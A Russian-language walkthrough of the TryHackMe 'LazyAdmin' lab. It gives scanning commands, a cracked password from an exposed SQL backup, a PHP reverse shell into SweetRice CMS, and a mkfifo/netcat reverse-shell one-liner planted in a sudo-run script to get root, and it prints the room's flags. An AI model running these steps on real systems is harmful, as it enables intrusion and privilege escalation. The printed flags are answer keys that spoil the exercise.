[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [LazyAdmin](https://tryhackme.com/r/room/lazyadmin) 

Всего 1 заданиe:
## Задание 1
Развлекайтесь! Может быть несколько способов получить доступ пользователя.

### Ответить на вопросы ниже
Что такое флаг пользователя?
```commandline
nmap -sC -sV $IP
gobuster dir -u $IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u $IP/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
wget http://$IP/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
cat mysql_bakup_20191129023059-1.5.1.sql
# 42f749ade7f9e195bf475f37a44cafcb
# https://crackstation.net/
# Password123

# $IP/content/as
Username: manager
Password: Password123

#  reverse shell php for CMS sweetrice 1.5.1
nc -nlvp 1234

$ whoami
www-data
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```
```commandline
THM{63e5bce9271952aad1113b6f1ac28a07}
```
Что такое корневой флаг?
```commandline
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

$ ls -l backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 backup.pl
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

$ ls -l /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $my_IP 5555 >/tmp/f

nc -nlvp 5555

$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $my_IP 5555 >/tmp/f" > /etc/copy.sh
$ sudo perl /home/itguy/backup.pl

$ nc -nlvp 5555
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
```commandline
THM{6637f41d0177b6f37cb20d775124699f}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)